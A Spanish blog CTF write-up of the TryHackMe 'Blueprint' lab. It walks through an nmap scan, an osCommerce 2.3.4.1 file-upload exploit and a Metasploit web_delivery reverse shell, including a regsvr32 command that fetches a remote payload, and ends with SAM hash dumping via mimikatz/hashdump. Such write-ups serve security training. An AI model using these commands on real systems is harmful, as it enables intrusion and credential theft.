<!doctype html><html lang=es>
<head>
<title>
Blueprint - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Fácil MrSeth6797    Reconocimiento Corrimos un típico nmap
╰─ lanfran@parrot ❯ map 10.10.17.115 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 12:02 CEST Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 53.85% done; ETC: 12:05 (0:00:49 remaining) Nmap scan report for 10.10.17.115 Host is up (0.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/blueprint/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/blueprint/cover.jpeg">
<meta name=twitter:title content="Blueprint - Write Up - Español">
<meta name=twitter:description content="Maquina de nivel fácil en TryHackMe.">
<meta property="og:title" content="Blueprint - Write Up - Español">
<meta property="og:description" content="Maquina de nivel fácil en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/blueprint/"><meta property="og:image" content="/es/posts/blueprint/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-09T12:14:38+02:00">
<meta property="article:modified_time" content="2021-07-09T12:14:38+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head><body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li><ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header><div class=content>
<div class=post>
<h1 class=post-title>Blueprint - Write Up - Español</h1><div class=post-meta>
<span class=post-date>
2021-07-09
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 5 mins lectura</span>
</div><span class=post-tags>
<a href=/tags/oscommerce/>#osCommerce</a>&nbsp;
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/metasploit/>#metasploit</a>&nbsp;
<a href=/tags/kiwi/>#kiwi</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/blueprint/cover.jpeg alt="Blueprint - Write Up - Español">
</figure><div class=post-content>
<h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#lab-user-ntml-hash-decrypted>&ldquo;Lab&rdquo; user NTML hash decrypted</a></li></ul></nav></aside><table>
<thead>
<tr>
<th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody>
<tr>
<td><a href=https://tryhackme.com/room/blueprint>Aquí</a></td><td>Fácil</td><td><a href=https://tryhackme.com/p/MrSeth6797>MrSeth6797</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Corrimos un típico <code>nmap</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ map 10.10.17.115                                                                                               ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-09 12:02 CEST
</span></span><span style=display:flex><span>Stats: 0:01:44 elapsed; <span style=color:#ae81ff>0</span> hosts completed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> up<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> undergoing Service Scan
</span></span><span style=display:flex><span>Service scan Timing: About 53.85% <span style=color:#66d9ef>done</span>; ETC: 12:05 <span style=color:#f92672>(</span>0:00:49 remaining<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.17.115
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>987</span> closed ports
</span></span><span style=display:flex><span>PORT      STATE SERVICE      VERSION
</span></span><span style=display:flex><span>80/tcp    open  http         Microsoft IIS httpd 7.5
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style=display:flex><span>|_http-title: <span style=color:#ae81ff>404</span> - File or directory not found.
</span></span><span style=display:flex><span>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>443/tcp   open  ssl/http     Apache httpd 2.4.23 <span style=color:#f92672>(</span>OpenSSL/1.0.2h PHP/5.6.28<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.23 <span style=color:#f92672>(</span>Win32<span style=color:#f92672>)</span> OpenSSL/1.0.2h PHP/5.6.28
</span></span><span style=display:flex><span>|_http-title: Index of /
</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>localhost
</span></span><span style=display:flex><span>| Not valid before: 2009-11-10T23:48:47
</span></span><span style=display:flex><span>|_Not valid after:  2019-11-08T23:48:47
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds Windows <span style=color:#ae81ff>7</span> Home Basic <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>3306/tcp  open  mysql        MariaDB <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8080/tcp  open  http         Apache httpd 2.4.23 <span style=color:#f92672>(</span>OpenSSL/1.0.2h PHP/5.6.28<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.23 <span style=color:#f92672>(</span>Win32<span style=color:#f92672>)</span> OpenSSL/1.0.2h PHP/5.6.28
</span></span><span style=display:flex><span>|_http-title: Index of /
</span></span><span style=display:flex><span>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49159/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49160/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: mean: -17m57s, deviation: 34m37s, median: 2m01s
</span></span><span style=display:flex><span>|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5b:ac:b6:9d:0d <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb-os-discovery: 
</span></span><span style=display:flex><span>|   OS: Windows <span style=color:#ae81ff>7</span> Home Basic <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>Windows <span style=color:#ae81ff>7</span> Home Basic 6.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1
</span></span><span style=display:flex><span>|   Computer name: BLUEPRINT
</span></span><span style=display:flex><span>|   NetBIOS computer name: BLUEPRINT<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   Workgroup: WORKGROUP<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|_  System time: 2021-07-09T11:06:53+01:00
</span></span><span style=display:flex><span>| smb-security-mode: 
</span></span><span style=display:flex><span>|   account_used: guest
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   2.02: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2021-07-09T10:06:52
</span></span><span style=display:flex><span>|_  start_date: 2021-07-09T10:02:29
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 123.09 seconds
</span></span></code></pre></div><p>Al ir a la página web en el puerto 8080, encontramos una carpeta llamada <code>/oscommerce-2.3.4/</code> así que tal vez podamos explotar esto &mldr;</p><p>Usemos <code>searchsploit</code> para buscar exploits &mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ searchsploit osCommerce 2.3.4.1                                                                                ─╯
</span></span><span style=display:flex><span>---------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                      |  Path
</span></span><span style=display:flex><span>---------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - <span style=color:#e6db74>&#39;currency&#39;</span> SQL Injection                                                       | php/webapps/46328.txt
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - <span style=color:#e6db74>&#39;products_id&#39;</span> SQL Injection                                                    | php/webapps/46329.txt
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - <span style=color:#e6db74>&#39;reviews_id&#39;</span> SQL Injection                                                     | php/webapps/46330.txt
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - <span style=color:#e6db74>&#39;title&#39;</span> Persistent Cross-Site Scripting                                        | php/webapps/49103.txt
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - Arbitrary File Upload                                                          | php/webapps/43191.py
</span></span><span style=display:flex><span>osCommerce 2.3.4.1 - Remote Code Execution                                                          | php/webapps/44374.py
</span></span><span style=display:flex><span>---------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ searchsploit -m <span style=color:#ae81ff>43191</span>                                                                                          ─╯
</span></span><span style=display:flex><span>  Exploit: osCommerce 2.3.4.1 - Arbitrary File Upload
</span></span><span style=display:flex><span>      URL: https://www.exploit-db.com/exploits/43191
</span></span><span style=display:flex><span>     Path: /usr/share/exploitdb/exploits/php/webapps/43191.py
</span></span><span style=display:flex><span>File Type: ASCII text, with CRLF line terminators
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copied to: /home/lanfran/THM/blueprint/43191.py
</span></span></code></pre></div><p>¡Estupendo! Descargamos el exploit para la carga arbitraria de archivos</p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Yendo a <code>http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/install.php</code></p><p>Podemos crear una nueva instalación, utilicé las siguientes credenciales:</p><p><img src=user.png alt=User></p><p>Después de esperar un rato, utilicé las credenciales <code>admin:password</code> para configurar el servidor.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ python 43191.py -f shell_online.php -u http://blueprint.thm:8080/oscommerce-2.3.4 --auth<span style=color:#f92672>=</span>admin:password            ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Authentication successful
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Successfully prepared the exploit and created a new newsletter with nID <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Successfully locked the newsletter. Now attempting to upload..
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Now trying to verify that the file shell_online.php uploaded..
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Got a HTTP <span style=color:#ae81ff>200</span> Reply <span style=color:#66d9ef>for</span> the uploaded file!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> The uploaded file should now be available at http://blueprint.thm:8080/oscommerce-2.3.4/catalog/admin/shell_online.php
</span></span></code></pre></div><p>¡Estupendo! Usemos <code>metasploit</code> para obtener una shell reversa.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 &gt; use multi/script/web_delivery
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload python/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; set LHOST tun0
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span>&gt; tun0
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; set SERVHOST 10.10.17.115
</span></span><span style=display:flex><span>SERVHOST <span style=color:#f92672>=</span>&gt; 10.10.17.115
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; set payload windows/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; set target <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 0.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.9.1.222:4444 
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using URL: http://0.0.0.0:8080/bCkvAgou9kpSIQ
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Local IP: http://192.168.1.254:8080/bCkvAgou9kpSIQ
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Server started.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Run the following command on the target machine:
</span></span><span style=display:flex><span>regsvr32 /s /n /u /i:http://10.9.1.222:8080/bCkvAgou9kpSIQ.sct scrobj.dll
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.17.115     web_delivery - Handling .sct Request
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.17.115     web_delivery - Delivering Payload <span style=color:#f92672>(</span><span style=color:#ae81ff>1900</span> bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>175174</span> bytes<span style=color:#f92672>)</span> to 10.10.17.115
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.9.1.222:4444 -&gt; 10.10.17.115:49441<span style=color:#f92672>)</span> at 2021-07-09 12:34:45 +0200
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/script/web_delivery<span style=color:#f92672>)</span> &gt; sessions -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                     Information                      Connection
</span></span><span style=display:flex><span>  --  ----  ----                     -----------                      ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         meterpreter x86/windows  NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM @ BLUEPRINT  10.9.1.222:4444 -&gt; 10.10.17.115:49441 <span style=color:#f92672>(</span>10.10.17.115<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>¡¡¡Woohoo !!! ¡¡Tenemos una shell con <code>NT AUTHORITY\SYSTEM</code>!!</p><p>Es el usuario de máximo privilegio en Windows.</p><p>Así que creemos una <code>shell</code> para leer nuestra flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>4748</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>1</span> created.
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\x</span>ampp<span style=color:#ae81ff>\h</span>tdocs<span style=color:#ae81ff>\o</span>scommerce-2.3.4<span style=color:#ae81ff>\c</span>atalog<span style=color:#ae81ff>\a</span>dmin&gt;cd C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
</span></span><span style=display:flex><span>cd C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop&gt;type root.txt.txt
</span></span><span style=display:flex><span>type root.txt.txt
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</span></span></code></pre></div><h2 id=lab-user-ntml-hash-decrypted>&ldquo;Lab&rdquo; user NTML hash decrypted</h2><p>Para volcar los hashes puedes usar <code>kiwi</code>, o <code>hashdump</code></p><ul>
<li>Con kiwi:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; load kiwi
</span></span><span style=display:flex><span>Loading extension kiwi...
</span></span><span style=display:flex><span>  .#####.   mimikatz 2.2.0 <span style=color:#ae81ff>20191125</span> <span style=color:#f92672>(</span>x86/windows<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> .## ^ <span style=color:#75715e>##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style=color:#f92672>(</span> vincent.letoux@gmail.com <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Success.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; lsa_dump_sam 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Running as SYSTEM
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping SAM
</span></span><span style=display:flex><span>Domain : BLUEPRINT
</span></span><span style=display:flex><span>SysKey : 147a48de4a9815d2aa479598592b086f
</span></span><span style=display:flex><span>Local SID : S-1-5-21-3130159037-241736515-3168549210
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SAMKey : 3700ddba8f7165462130a4441ef47500
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000001f4 <span style=color:#f92672>(</span>500<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Administrator
</span></span><span style=display:flex><span>  Hash NTLM: <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000001f5 <span style=color:#f92672>(</span>501<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Guest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000003e8 <span style=color:#f92672>(</span>1000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Lab
</span></span><span style=display:flex><span>  Hash NTLM: <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
</span></span></code></pre></div><ul>
<li>Con hashdump</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; hashdump
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>:::
</span></span><span style=display:flex><span>Lab:1000:aad3b435b51404eeaad3b435b51404ee:<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>:::
</span></span></code></pre></div><p>Y crackea los hashes con <a href=https://crackstation.net/>crackstation</a></p><p>¡Y hemos finalizado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div><div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/cold_vvars/>
<span class=button__icon>←</span>
<span class=button__text>Cold VVars - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/internal/>
<span class=button__text>Internal - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div></div><footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
<script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script>
</div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
</body></html>